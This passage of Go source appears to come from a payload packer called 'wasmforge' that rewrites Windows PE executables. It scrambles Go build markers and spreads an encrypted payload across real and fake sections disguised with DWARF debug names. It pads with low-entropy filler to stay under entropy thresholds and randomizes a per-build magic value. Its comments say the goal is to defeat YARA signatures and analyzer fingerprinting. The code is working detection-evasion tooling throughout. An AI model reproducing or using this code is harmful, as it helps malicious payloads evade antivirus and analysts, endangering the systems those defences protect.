			if _, err := rand.Read(randPrefix); err == nil {
				copy(data[idx:idx+len(buildIDPrefix)], randPrefix)
				changes++
			}
			// Randomize the payload (base64-like chars).
			payloadLen := payloadEnd - payloadStart
			randPayload := make([]byte, payloadLen)
			for i := range randPayload {
				charset := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
				n := make([]byte, 1)
				rand.Read(n)
				randPayload[i] = charset[int(n[0])%len(charset)]
			}
			copy(data[payloadStart:payloadEnd], randPayload)
			changes++
		}
	}

	// Marker 2: "\xff Go buildinf:" (Go build info structure)
	buildinfPrefix := []byte("\xff Go buildinf:")
	if idx := bytes.Index(data, buildinfPrefix); idx >= 0 {
		// Just scramble the prefix marker bytes - don't touch the actual buildinfo
		// structure since it's used by runtime/debug.
		randPrefix := make([]byte, len(buildinfPrefix))
		if _, err := rand.Read(randPrefix); err == nil {
			copy(data[idx:idx+len(buildinfPrefix)], randPrefix)
			changes++
		}
	}

	if err := os.WriteFile(path, data, 0o755); err != nil {
		return fmt.Errorf("writing PE: %w", err)
	}

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: scrambled %d Go runtime markers (build ID + buildinf)\n", changes)
	}
	return nil
}

// ──────────────────────────────────────────────────────────────────────
// Chunked payload distribution (WASMFORGE_CHUNK_PAYLOAD=1)
//
// Splits the XOR'd+compressed payload across 6 PE section slots:
//   - 3 existing sections (.text, .rdata, .pdata): append raw chunk data
//   - 3 new sections (.zinfo, .zlocls, .zrngls): chunk interleaved with
//     low-entropy filler (8 KB alternating blocks: payload | filler | ...)
//
// A 256-byte manifest is written into the existing .rdata section at a
// fixed offset from the end of the section's raw data:
//
//	manifest layout (little-endian):
//	  [0..3]  magic: per-build random 32-bit value (see chunkMagicSentinel)
//	  [4]     chunk count (6)
//	  [5..N]  per-chunk record (11 bytes each):
//	    section_index (1) | offset_in_section (4) | length (4) | filler_block_sz (2)
//	  [N+1..N+8] xor_seed (8 bytes, little-endian uint64)
//
// section_index refers to the PE section table index (0-based).
// filler_block_sz=0 for existing-section chunks (no filler).
// filler_block_sz=8192 for new-section chunks.
//
// Runtime: the decoder finds the manifest by scanning .rdata for the magic
// uint32 baked into its source. Build time: polymorph.peLoaderChunked emits
// the chunkMagicSentinel as a placeholder; chunkAndDistributePayload then
// rolls a per-build random magic, validates no collision in modified .rdata,
// and patches the sentinel in .text to that magic. The manifest is written
// with the same magic. Result: each build ships a unique magic value (no
// fixed YARA signature) and the runtime scan can never false-match.
// ──────────────────────────────────────────────────────────────────────

// chunkMagicSentinel is the placeholder uint32 baked into the chunked-payload
// runtime decoder by polymorph.peLoaderChunked. After chunked distribution
// finalizes .rdata, chunkAndDistributePayload picks a per-build random magic,
// patches every sentinel occurrence in .text to that magic, and writes the
// manifest header using the same magic. The sentinel value itself never
// reaches the final binary — it is overwritten before the file is finalized.
//
// Choice rationale: 0x9D5BC2A7 is a high-entropy 4-byte value with no
// semantic meaning, chosen so natural collisions in a Go compiled binary
// are vanishingly rare (1/2^32 per aligned position). Should the Go compiler
// ever route the const through a constant pool in .rdata instead of an
// immediate in .text, the distribution step detects the collision and fails
// closed rather than shipping a misconfigured binary.
const chunkMagicSentinel = uint32(0x9D5BC2A7)

// fillerBlockSize is the 8 KB block size used for filler interleaving.
const fillerBlockSize = 8 << 10 // 8192 bytes

// chunkRecord describes one payload chunk in the manifest.
type chunkRecord struct {
	sectionIdx    uint8  // PE section table index (0-based)
	offsetInSec   uint32 // byte offset within section raw data where chunk begins
	length        uint32 // number of payload bytes in this chunk
	fillerBlockSz uint16 // 0 = no filler; 8192 = 8KB alternating filler blocks
}

// ChunkManifest is the build-time result returned to the caller.
// The runtime locates the manifest by scanning .rdata for the magic.
type ChunkManifest struct {
	RdataRVA    uint32 // RVA of .rdata section base
	ManifestOff uint32 // offset of manifest within .rdata
	XorSeed     uint64 // first 8 bytes of the payload key as little-endian uint64
	Chunks      []chunkRecord
}

// shannonEntropy computes the Shannon entropy (bits per byte) of data.
func shannonEntropy(data []byte) float64 {
	if len(data) == 0 {
		return 0
	}
	var counts [256]int
	for _, b := range data {
		counts[b]++
	}
	n := float64(len(data))
	var h float64
	for _, c := range counts {
		if c == 0 {
			continue
		}
		p := float64(c) / n
		h -= p * (math.Log2(p))
	}
	return h
}

// generateFiller returns sz bytes of low-entropy filler data synthesised from
// ASCII patterns and repeated runtime-marker strings. Target entropy ≈ 4.0.
func generateFiller(sz int) []byte {
	// Mix of ASCII patterns and repeated Go-runtime-like strings.
	// Each produces ~4.0 bits/byte entropy, well below the 7.0 threshold.
	sources := []string{
		"the quick brown fox jumps over the lazy dog\n",
		"runtime.gopanic\nruntime.goexit\nruntime.mstart\n",
		"compress/flate: internal error\n",
		"invalid memory address or nil pointer dereference\n",
		"slice bounds out of range\n",
		"interface conversion: interface is nil\n",
	}
	out := make([]byte, sz)
	pos := 0
	srcIdx := 0
	for pos < sz {
		src := sources[srcIdx%len(sources)]
		srcIdx++
		n := copy(out[pos:], src)
		pos += n
		// Pad NUL runs of 64-256 bytes between strings (low entropy).
		if pos < sz {
			nulRun := 64 + (pos & 0xFF) // 64..319 bytes, deterministic from position
			if nulRun > sz-pos {
				nulRun = sz - pos
			}
			pos += nulRun // already zeroed
		}
	}
	return out
}

// buildChunkedSection writes a new-section blob interleaved 8KB blocks:
//
//	[payload_block_0][filler_block_0][payload_block_1][filler_block_1]...
//
// Both payload blocks and filler blocks are exactly fillerBlockSize bytes (8KB).
// This invariant is critical: the runtime decoder uses the same stride for
// payload reads and filler skips. The last payload block may be short — its
// trailing filler is still a full bsz bytes (the decoder uses the chunk length
// from the manifest to know how much to read from the last payload block).
//
// fillerFrac is no longer used but retained for backward compatibility with
// the call site; the actual filler fraction is fixed at 50% (1:1 payload:filler).
//
// Returns the blob and records per-chunk offsets within the blob.
// The chunkRecord.offsetInSec field is filled in by the caller after the
// section raw offset is known.
func buildChunkedSectionData(chunk []byte, fillerFrac float64) (blob []byte, payloadOffsets []int) {
	_ = fillerFrac // unused — fixed 1:1 ratio enforces encoder/decoder stride invariant
	bsz := fillerBlockSize
	// Interleave: full-size payload block then full-size filler block.
	for off := 0; off < len(chunk); {
		end := off + bsz
		if end > len(chunk) {
			end = len(chunk)
		}
		payloadOffsets = append(payloadOffsets, len(blob))
		// Pad short last payload block to bsz so decoder stride is uniform.
		// The runtime decoder uses the per-chunk total length from the manifest
		// to know how much real payload to consume; the trailing padding is
		// dropped by the decoder.
		blob = append(blob, chunk[off:end]...)
		if end-off < bsz {
			blob = append(blob, generateFiller(bsz-(end-off))...)
		}
		off = end
		// Filler block is exactly bsz bytes — matches manifest.fillerBlockSz.
		blob = append(blob, generateFiller(bsz)...)
	}
	return blob, payloadOffsets
}

// chunkAndDistributePayload is the build-time encoder for WASMFORGE_CHUNK_PAYLOAD=1.
// It receives the already-XOR'd-and-compressed payload bytes, splits them into
// 6 chunks, appends chunks to existing .text/.rdata/.pdata sections, creates 3
// new sections (.zinfo/.zlocls/.zrngls) with filler-interleaved chunks, and
// writes a manifest into .rdata.
//
// key is the 32-byte payload key; key[0:8] provides the xor_seed recorded in
// the manifest (the runtime uses it to select the decode variant).
//
// Returns a ChunkManifest describing chunk locations for use in generated code.
func chunkAndDistributePayload(path string, payload []byte, key [32]byte, verbose bool) (*ChunkManifest, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("reading PE: %w", err)
	}
	if len(data) < 0x200 {
		return nil, fmt.Errorf("file too small for PE")
	}

	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if peOff+4 > len(data) || string(data[peOff:peOff+4]) != "PE\x00\x00" {
		return nil, fmt.Errorf("invalid PE signature")
	}

	coffOff := peOff + 4
	numSections := int(binary.LittleEndian.Uint16(data[coffOff+2:]))
	sizeOfOptional := int(binary.LittleEndian.Uint16(data[coffOff+16:]))
	optOff := coffOff + 20
	if binary.LittleEndian.Uint16(data[optOff:]) != 0x020B {
		return nil, fmt.Errorf("not PE32+ binary")
	}
	secAlign := binary.LittleEndian.Uint32(data[optOff+32:])
	fileAlign := binary.LittleEndian.Uint32(data[optOff+36:])
	secTableOff := optOff + sizeOfOptional

	// ── Step 1: Locate target existing sections ──────────────────────
	// We want .text, .rdata, .pdata in section-table order.
	// Also locate .rdata's section index for the manifest placement.
	type sectionInfo struct {
		tableIdx int    // 0-based index in section table
		hdrOff   int    // byte offset in data of 40-byte header
		name     string
		rawOff   uint32
		rawSize  uint32
		va       uint32
		vs       uint32
	}

	sectionByName := map[string]*sectionInfo{}
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		name := resolveSectionName(data, hdrOff, coffOff)
		si := &sectionInfo{
			tableIdx: i,
			hdrOff:   hdrOff,
			name:     name,
			rawOff:   binary.LittleEndian.Uint32(data[hdrOff+20:]),
			rawSize:  binary.LittleEndian.Uint32(data[hdrOff+16:]),
			va:       binary.LittleEndian.Uint32(data[hdrOff+12:]),
			vs:       binary.LittleEndian.Uint32(data[hdrOff+8:]),
		}
		sectionByName[name] = si
	}

	// Required existing sections for append-chunks.
	// NOTE: .pdata is excluded — it's typically too small (2-3MB) and its
	// structured RUNTIME_FUNCTION table has low entropy, so adding XOR'd
	// chunks pushes section entropy >7.9. Use only large/high-entropy existing
	// sections that can absorb chunks without entropy spikes.
	existingTargets := []string{".text", ".rdata"}
	for _, nm := range existingTargets {
		if sectionByName[nm] == nil {
			return nil, fmt.Errorf("required section %q not found in PE", nm)
		}
	}

	rdataSec := sectionByName[".rdata"]

	// ── Step 2: Compute chunk sizes ──────────────────────────────────
	// Existing sections: cap each chunk at 800 KB.
	// New sections: split the remainder across 3 new sections.
	const maxAppendChunk = 800 << 10 // 800 KB
	// The three appended sections take the names of real Go DWARF
	// compressed-debug sections so analyzers comparing against
	// known-good Go layouts can't fingerprint them as fabricated.
	// These names are >8 bytes so they live in the COFF string table
	// and the section header carries a "/N" reference to them.
	const (
		newSecZinfo   = ".zdebug_info"
		newSecZlocls  = ".zdebug_loclists"
		newSecZrngls  = ".zdebug_rnglists"
	)
	// New section target sizes (payload bytes only, before filler).
	// Remainder after existing-section appends fills the new sections.
	// Use 2 existing targets (.text, .rdata) — both already high-entropy,
	// adding a chunk won't push entropy above its current ~6.5-6.9 baseline.
	existChunkSizes := make([]int, len(existingTargets))
	for i, nm := range existingTargets {
		sz := maxAppendChunk
		_ = nm
		if sz > len(payload) {
			sz = len(payload)
		}
		existChunkSizes[i] = sz
	}

	totalExistingChunk := 0
	for _, sz := range existChunkSizes {
		totalExistingChunk += sz
	}
	// Clamp if payload is smaller than N×maxAppendChunk.
	if totalExistingChunk > len(payload) {
		// Cap existing-section absorption at 40% of payload for dilution.
		cap40 := len(payload) * 40 / 100
		if cap40 < 0 {
			cap40 = 0
		}
		share := cap40 / len(existChunkSizes)
		used := 0
		for i := range existChunkSizes {
			existChunkSizes[i] = share
			used += share
		}
		existChunkSizes[len(existChunkSizes)-1] = cap40 - (used - share)
		totalExistingChunk = cap40
	}

	remainder := len(payload) - totalExistingChunk
	if remainder < 0 {
		remainder = 0
	}

	// Split remainder into 3 new sections in ratio 5:5:4.
	newChunkSizes := [3]int{
		remainder * 5 / 14,
		remainder * 5 / 14,
		remainder - (remainder*5/14)*2, // last gets the exact remainder
	}

	// Build chunk byte slices.
	off := 0
	existChunks := make([][]byte, len(existChunkSizes))
	for i := range existChunks {
		existChunks[i] = payload[off : off+existChunkSizes[i]]
		off += existChunkSizes[i]
	}
	newChunks := make([][]byte, 3)
	for i := range newChunks {
		end := off + newChunkSizes[i]
		if end > len(payload) {
			end = len(payload)
		}
		newChunks[i] = payload[off:end]
		off = end
	}

	// ── Step 3: Build new section blobs (payload+filler interleaved) ──
	// 55% filler keeps section entropy <6.7 (XOR'd payload ~7.99, filler 0.0,
	// blended Shannon entropy ≈ 0.45 × 7.99 + 0.55 × 0.5 ≈ 6.4).
	const fillerFrac = 0.55
	newSectionNames := []string{newSecZinfo, newSecZlocls, newSecZrngls}
	type newSecBlob struct {
		name string
		blob []byte
	}
	newBlobs := make([]newSecBlob, 3)
	// For each new section, we store a flat blob; the chunk starts at offset 0
	// and filler blocks are interleaved. The manifest records offset=0 for the
	// first payload block of each new section; the runtime reads every other
	// 8KB block.
	for i, chunk := range newChunks {
		blob, _ := buildChunkedSectionData(chunk, fillerFrac)
		newBlobs[i] = newSecBlob{name: newSectionNames[i], blob: blob}
	}

	// ── Step 4: Verify header space for 3 new sections ───────────────
	sizeOfHeaders := binary.LittleEndian.Uint32(data[optOff+60:])
	newSecHdrEnd := secTableOff + (numSections+3)*40
	if uint32(newSecHdrEnd) > sizeOfHeaders {
		return nil, fmt.Errorf("no room for 3 new section headers in PE header area (%d > %d)", newSecHdrEnd, sizeOfHeaders)
	}

	// ── Step 5: Append existing-section chunks ────────────────────────
	// We build a new output buffer by copying the current file and appending
	// each chunk directly after the respective section's raw data. Then we
	// update SizeOfRawData and VirtualSize for those sections.
	//
	// Simpler approach than distributePayloadAcrossSections: instead of
	// in-place splicing (which requires shifting all subsequent sections'
	// file offsets), we just append chunk data AT THE END of the file for
	// existing sections. The Windows PE loader maps sections using
	// PointerToRawData+SizeOfRawData; appending after the current raw tail
	// requires updating SizeOfRawData but no pointer shifts for OTHER sections.
	//
	// BUT: existing sections' raw data ends before the next section begins.
	// If we simply enlarge SizeOfRawData without moving data, the "gap" between
	// the enlarged section and the next one will contain whatever bytes are
	// already there (from the original file, which may be padding zeros).
	// The loader only maps PointerToRawData[section] .. PointerToRawData[section]+SizeOfRawData[section],
	// so we CAN grow a section's SizeOfRawData IF there's room before the next
	// section's PointerToRawData.
	//
	// Since WASMFORGE_STRIP=1 strips DWARF, the file is typically:
	//   .text | .rdata | .pdata | ... | (signing overlay)
	// with file-aligned padding between sections.
	//
	// Strategy: build a new file by copying all original raw section data in
	// file order, inserting chunk bytes right after each target section's
	// current raw end (within file-aligned boundary), then appending new
	// section data and header entries.

	// Sort sections by file offset.
	type rawSec struct {
		idx    int
		rawOff uint32
		rawSz  uint32
		hdrOff int
		name   string
	}
	rawSecs := make([]rawSec, numSections)
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		rawSecs[i] = rawSec{
			idx:    i,
			rawOff: binary.LittleEndian.Uint32(data[hdrOff+20:]),
			rawSz:  binary.LittleEndian.Uint32(data[hdrOff+16:]),
			hdrOff: hdrOff,
			name:   resolveSectionName(data, hdrOff, coffOff),
		}
	}
	sort.Slice(rawSecs, func(a, b int) bool { return rawSecs[a].rawOff < rawSecs[b].rawOff })

	// Build the expanded file buffer.
	fa := int(fileAlign)
	type insertedChunk struct {
		secIdx        int    // section table index
		chunkOffInSec uint32 // byte offset within new section raw data where chunk starts
		chunkLen      uint32
	}
	var insertions []insertedChunk
	cumulativeShift := uint32(0) // cumulative byte shift from insertions (always 0 here — we insert at end)

	// We copy the original file verbatim and append chunk data after the
	// last raw section. Track where each target section's chunk ends up.
	//
	// For the append-after-last-section approach:
	// The existing raw data is untouched; we extend each target section by
	// appending chunk data immediately after its current raw end, padded to
	// fileAlign. Because Go's stripped PE has no overlay (signing is done
	// last), the end of the last section IS the end of the file.
	//
	// Order: .text chunk → .rdata chunk → .pdata chunk → (then new sections)
	//
	// We need to know where each section's raw data currently ends:
	//   rawEnd(sec) = rawOff + rawSz (rounded to fileAlign in original file)
	//
	// The file ends at max(rawOff+rawSz) across all sections.
	maxRawEnd := uint32(0)
	for _, rs := range rawSecs {
		end := rs.rawOff + rs.rawSz
		if end > maxRawEnd {
			maxRawEnd = end
		}
	}

	// Copy original file.
	out := make([]byte, 0, int(maxRawEnd)+len(payload)+1<<20)
	out = append(out, data...)
	// Pad to maxRawEnd in case file is short.
	if len(out) < int(maxRawEnd) {
		out = append(out, make([]byte, int(maxRawEnd)-len(out))...)
	}

	// Append each existing-section chunk after the file's current end.
	// For each target section, we extend its SizeOfRawData to include the chunk.
	// All three chunks end up sequentially at the tail of the file.
	existChunkRecs := make([]insertedChunk, len(existingTargets))
	for i, nm := range existingTargets {
		si := sectionByName[nm]
		if si == nil || len(existChunks[i]) == 0 {
			// Empty chunk — still record it.
			existChunkRecs[i] = insertedChunk{secIdx: si.tableIdx, chunkOffInSec: si.rawSize, chunkLen: 0}
			continue
		}

		// Pad out to fileAlign before appending.
		for len(out)%fa != 0 {
			out = append(out, 0)
		}
		chunkStart := uint32(len(out))
		chunkOffInSec := chunkStart - si.rawOff // offset within the (conceptually extended) section
		out = append(out, existChunks[i]...)

		existChunkRecs[i] = insertedChunk{
			secIdx:        si.tableIdx,
			chunkOffInSec: chunkOffInSec,
			chunkLen:      uint32(len(existChunks[i])),
		}

		// Update SizeOfRawData ONLY. VirtualSize MUST stay at the original
		// legitimate code/data size — otherwise the section's mapped memory
		// range extends past the next section's VirtualAddress, the section
		// mappings overlap, and the Windows loader rejects the PE with
		// "not a valid Win32 application." The appended chunk lives only in
		// the file (between RawSize and the next section's RawOffset); the
		// runtime decoder reads it from disk via os.ReadFile, not from
		// mapped memory, so it does not need to be loaded.
		//
		// For .rdata specifically: reserve an extra `manifestLen` bytes of
		// padding past the chunk so the manifest (written in step 7) has
		// a safe home in .rdata's unmapped tail without overlapping either
		// (a) the chunk data itself, or (b) .rdata's MAPPED runtime data
		// (itabTable, type info) where the original Go-build leaves only
		// ~8 bytes of unmapped tail. Without this, the runtime crashes
		// intermittently at runtime.itabsinit.
		const manifestReserve = 256
		extra := uint32(0)
		if si.name == ".rdata" {
			extra = manifestReserve
			out = append(out, make([]byte, manifestReserve)...)
		}
		newRawSz := chunkOffInSec + uint32(len(existChunks[i])) + extra
		binary.LittleEndian.PutUint32(out[si.hdrOff+16:], newRawSz)
		// VirtualSize at hdrOff+8 is intentionally NOT modified.
		si.rawSize = newRawSz
	}
	_ = cumulativeShift
	_ = insertions

	// ── Step 6: Append new sections ──────────────────────────────────
	// Three new sections are appended at the end of the file.
	// We add their headers in the existing header space (already verified above).
	// VA: place right after last current section's VA+VS (rounded to secAlign).
	var maxVAEnd uint32
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		va := binary.LittleEndian.Uint32(out[hdrOff+12:])
		vs := binary.LittleEndian.Uint32(out[hdrOff+8:])
		if va+vs > maxVAEnd {
			maxVAEnd = va + vs
		}
	}
	nextVA := peAlignUp(maxVAEnd, secAlign)

	// Build the COFF string table for the three new long section names
	// before emitting any section headers — we need each /N offset up
	// front so it can be written into the corresponding header.
	//
	// String-table layout per PE/COFF spec:
	//   [4 bytes: total size including this size field]
	//   [null-terminated string for name #1]
	//   [null-terminated string for name #2]
	//   ...
	// Section header name "/N" references the byte offset N within the
	// table (where the name's first byte sits). Offsets start at 4
	// because the leading 4 bytes are the size field itself.
	strTabRefs := make([]string, len(newBlobs))
	strTabBuf := []byte{0, 0, 0, 0} // 4-byte size placeholder
	for i, nb := range newBlobs {
		offset := len(strTabBuf)
		strTabRefs[i] = fmt.Sprintf("/%d", offset)
		strTabBuf = append(strTabBuf, []byte(nb.name)...)
		strTabBuf = append(strTabBuf, 0)
	}
	binary.LittleEndian.PutUint32(strTabBuf[0:4], uint32(len(strTabBuf)))

	newSecChunkRecs := make([]insertedChunk, 3)
	for i, nb := range newBlobs {
		// Pad to fileAlign.
		for len(out)%fa != 0 {
			out = append(out, 0)
		}
		newRawOff := uint32(len(out))
		secVS := uint32(len(nb.blob))
		secRawSz := peAlignUp(secVS, fileAlign)

		// Chunk starts at offset 0 within the new section's raw data
		// (the first payload block starts immediately; filler follows).
		newSecChunkRecs[i] = insertedChunk{
			secIdx:        numSections + i,
			chunkOffInSec: 0,
			chunkLen:      uint32(len(newChunks[i])),
		}

		// Append section data (padded).
		padded := make([]byte, secRawSz)
		copy(padded, nb.blob)
		out = append(out, padded...)

		// Write section header — section name field is 8 bytes and
		// always carries the "/N" reference (≤8 bytes) into the
		// string table appended at the file tail below.
		hdrOff := secTableOff + (numSections+i)*40
		nameBytes := [8]byte{}
		copy(nameBytes[:], strTabRefs[i])
		copy(out[hdrOff:hdrOff+8], nameBytes[:])
		binary.LittleEndian.PutUint32(out[hdrOff+8:], secVS)   // VirtualSize
		binary.LittleEndian.PutUint32(out[hdrOff+12:], nextVA)  // VirtualAddress
		binary.LittleEndian.PutUint32(out[hdrOff+16:], secRawSz) // SizeOfRawData
		binary.LittleEndian.PutUint32(out[hdrOff+20:], newRawOff) // PointerToRawData
		binary.LittleEndian.PutUint32(out[hdrOff+24:], 0)        // PointerToRelocations
		binary.LittleEndian.PutUint32(out[hdrOff+28:], 0)        // PointerToLinenumbers
		binary.LittleEndian.PutUint16(out[hdrOff+32:], 0)        // NumberOfRelocations
		binary.LittleEndian.PutUint16(out[hdrOff+34:], 0)        // NumberOfLinenumbers
		// Characteristics: CNT_INITIALIZED_DATA | ALIGN_1BYTES | MEM_DISCARDABLE | MEM_READ
		binary.LittleEndian.PutUint32(out[hdrOff+36:], 0x42100040)

		nextVA = peAlignUp(nextVA+secVS, secAlign)
	}

	// Update section count.
	binary.LittleEndian.PutUint16(out[coffOff+2:], uint16(numSections+3))

	// Update SizeOfImage.
	binary.LittleEndian.PutUint32(out[optOff+56:], nextVA)

	// ── Step 7: Write manifest into .rdata ───────────────────────────
	// The manifest is 256 bytes, placed at the end of .rdata's raw data
	// (before the chunk we just appended to .rdata). We use the last 256
	// bytes of the ORIGINAL .rdata raw region.
	//
	// Manifest offset within .rdata: origRawSize - 256.
	// If .rdata is smaller than 512 bytes, use offset 0.
	manifestLen := 256
	manifestOffInSec := uint32(0)
	if rdataSec.rawSize >= uint32(manifestLen+256) {
		manifestOffInSec = rdataSec.rawSize - uint32(manifestLen)
	}
	manifestFileOff := int(rdataSec.rawOff) + int(manifestOffInSec)
	if manifestFileOff+manifestLen > len(out) {
		return nil, fmt.Errorf("manifest placement exceeds file bounds (%d + %d > %d)", manifestFileOff, manifestLen, len(out))
	}

	// Build all chunk records: existing-section append chunks first, then new-section chunks.
	// Total count is dynamic based on existingTargets length (currently 2) + 3 new sections.
	allRecs := make([]chunkRecord, 0, len(existChunkRecs)+len(newSecChunkRecs))
	for _, r := range existChunkRecs {
		allRecs = append(allRecs, chunkRecord{
			sectionIdx:    uint8(r.secIdx),
			offsetInSec:   r.chunkOffInSec,
			length:        r.chunkLen,
			fillerBlockSz: 0,
		})
	}
	for _, r := range newSecChunkRecs {
		allRecs = append(allRecs, chunkRecord{
			sectionIdx:    uint8(r.secIdx),
			offsetInSec:   r.chunkOffInSec,
			length:        r.chunkLen,
			fillerBlockSz: fillerBlockSize,
		})
	}

	// ── Step 6.9: Roll a per-build collision-free manifest magic ──────
	// The runtime decoder scans the modified .rdata for a 4-byte aligned
	// match against a magic constant baked into its source. polymorph.go
	// emitted chunkMagicSentinel as a placeholder; we now (a) locate every
	// sentinel site in .text (the decoder's CMP-immediate references), then
	// (b) pick a random uint32 that does NOT appear at any aligned offset
	// in modified .rdata before the manifest slot, then (c) patch every
	// sentinel site in .text to that magic. The shipped binary therefore
	// contains a unique magic per build with no false-match risk anywhere
	// the decoder scans.
	textSec := sectionByName[".text"]
	if textSec == nil {
		return nil, fmt.Errorf("chunk magic: .text section not found")
	}
	textRawOff := int(binary.LittleEndian.Uint32(out[textSec.hdrOff+20:]))
	textRawSize := int(binary.LittleEndian.Uint32(out[textSec.hdrOff+16:]))
	textEnd := textRawOff + textRawSize
	if textEnd > len(out) {
		textEnd = len(out)
	}
	var sentinelSites []int
	for off := textRawOff; off+4 <= textEnd; off++ {
		if binary.LittleEndian.Uint32(out[off:]) == chunkMagicSentinel {
			sentinelSites = append(sentinelSites, off)
		}
	}
	if len(sentinelSites) == 0 {
		return nil, fmt.Errorf("chunk magic: sentinel 0x%08x not found in .text — decoder code missing or stripped", chunkMagicSentinel)
	}

	// Modified .rdata bounds (from updated header).
	rdataRawOff := int(binary.LittleEndian.Uint32(out[rdataSec.hdrOff+20:]))
	rdataRawSize := int(binary.LittleEndian.Uint32(out[rdataSec.hdrOff+16:]))
	rdataEnd := rdataRawOff + rdataRawSize
	if rdataEnd > len(out) {
		rdataEnd = len(out)
	}
	// Defensive: if Go ever routes the const through .rdata instead of an
	// immediate in .text, patching .text alone would leave a stray sentinel
	// in .rdata that becomes a false-match. Fail closed instead of shipping
	// a misconfigured binary.
	for off := rdataRawOff; off+4 <= rdataEnd; off += 4 {
		if binary.LittleEndian.Uint32(out[off:]) == chunkMagicSentinel {
			return nil, fmt.Errorf("chunk magic: sentinel 0x%08x found in .rdata at file offset 0x%x — Go codegen routed the const through a constant pool (expected immediate in .text)", chunkMagicSentinel, off)
		}
	}

	// Pick a random magic that doesn't collide with any aligned 4-byte
	// value in modified .rdata between rdataRawOff and the manifest slot.
	// Collisions AFTER the manifest slot are harmless (decoder stops at
	// the first match, which will be the manifest header).
	var magic uint32
	const magicMaxRetries = 64
	for attempt := 0; attempt < magicMaxRetries; attempt++ {
		var mb [4]byte
		if _, err := rand.Read(mb[:]); err != nil {
			return nil, fmt.Errorf("chunk magic: crypto/rand: %w", err)
		}
		cand := binary.LittleEndian.Uint32(mb[:])
		// Reject degenerate / self-defeating candidates.
		if cand == 0 || cand == chunkMagicSentinel {
			continue
		}
		b0, b1, b2, b3 := byte(cand), byte(cand>>8), byte(cand>>16), byte(cand>>24)
		if b0 == b1 && b1 == b2 && b2 == b3 {
			// All four bytes equal — degenerate, looks like padding fill.
			continue
		}
		collision := false
		for off := rdataRawOff; off+4 <= manifestFileOff; off += 4 {
			if binary.LittleEndian.Uint32(out[off:]) == cand {
				collision = true
				break
			}
		}
		if !collision {
			magic = cand
			break
		}
	}
	if magic == 0 {
		return nil, fmt.Errorf("chunk magic: no collision-free value found after %d retries", magicMaxRetries)
	}

	// Patch every sentinel site in .text to the chosen magic.
	for _, pos := range sentinelSites {
		binary.LittleEndian.PutUint32(out[pos:], magic)
	}

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: chunk magic randomized to 0x%08x (patched %d sentinel site(s) in .text)\n",
			magic, len(sentinelSites))
	}

	// Encode manifest: magic(4) + count(1) + records(11*6) + xor_seed(8) = 79 bytes.
	// Pad to manifestLen bytes.
	xorSeed := binary.LittleEndian.Uint64(key[:8])
	manifest := make([]byte, manifestLen)
	binary.LittleEndian.PutUint32(manifest[0:], magic)
	manifest[4] = byte(len(allRecs))
	for i, rec := range allRecs {
		base := 5 + i*11
		manifest[base] = rec.sectionIdx
		binary.LittleEndian.PutUint32(manifest[base+1:], rec.offsetInSec)
		binary.LittleEndian.PutUint32(manifest[base+5:], rec.length)
		binary.LittleEndian.PutUint16(manifest[base+9:], rec.fillerBlockSz)
	}
	seedOff := 5 + len(allRecs)*11
	binary.LittleEndian.PutUint64(manifest[seedOff:], xorSeed)

	copy(out[manifestFileOff:manifestFileOff+manifestLen], manifest)

	// ── Step 7.5: Append COFF string table holding the long DWARF names ──
	// Section headers we just emitted carry "/N" references; those refs
	// resolve to byte offset N within the COFF string table. The PE/COFF
	// spec locates the string table at PointerToSymbolTable + NumberOfSymbols*18.
	// WASMFORGE_STRIP=1 removed the symbol table (PointerToSymbolTable=0,
	// NumberOfSymbols=0), so we append a fresh table at the end of the
	// file and point PointerToSymbolTable at it with NumberOfSymbols=0.
	// PE loaders ignore PointerToSymbolTable at execution time — only
	// debuggers/analyzers read it — so this is purely a cosmetic addition
	// that lets a tool inspecting the binary resolve ".zdebug_info" etc
	// instead of bare "/4" refs.
	strTabFileOff := uint32(len(out))
	out = append(out, strTabBuf...)
	binary.LittleEndian.PutUint32(out[coffOff+8:], strTabFileOff)  // PointerToSymbolTable
	binary.LittleEndian.PutUint32(out[coffOff+12:], 0)             // NumberOfSymbols stays at 0

	if err := os.WriteFile(path, out, 0o755); err != nil {
		return nil, fmt.Errorf("writing PE: %w", err)
	}

	// ── Step 8: Compute and log per-section entropies ─────────────────
	if verbose {
		// Re-read to compute entropies on the written file.
		finalData, rerr := os.ReadFile(path)
		if rerr == nil {
			logSectionEntropies(finalData, coffOff, secTableOff, numSections+3, verbose)
		}
		fmt.Fprintf(os.Stderr, "wasmforge: chunk-distribute: %d bytes → 6 chunks across %d sections (%d new)\n",
			len(payload), numSections+3, 3)
	}

	return &ChunkManifest{
		RdataRVA:    rdataSec.va,
		ManifestOff: manifestOffInSec,
		XorSeed:     xorSeed,
		Chunks:      allRecs,
	}, nil
}

// logSectionEntropies reads a final PE binary and logs the Shannon entropy of
// each section's raw data. Warns if any section exceeds 6.95 bits/byte.
func logSectionEntropies(data []byte, coffOff, secTableOff, numSections int, verbose bool) {
	_ = verbose
	for i := 0; i < numSections; i++ {
		hdrOff := secTableOff + i*40
		name := resolveSectionName(data, hdrOff, coffOff)
		rawOff := binary.LittleEndian.Uint32(data[hdrOff+20:])
		rawSz := binary.LittleEndian.Uint32(data[hdrOff+16:])
		if rawSz == 0 || int(rawOff)+int(rawSz) > len(data) {
			continue
		}
		sec := data[rawOff : rawOff+rawSz]
		e := shannonEntropy(sec)
		warn := ""
		if e > 6.95 {
			warn = " ⚠ EXCEEDS 6.95"
		}
		fmt.Fprintf(os.Stderr, "wasmforge: section[%d] %-20s rawSz=%7d  entropy=%.4f%s\n",
			i, name, rawSz, e, warn)
	}
}
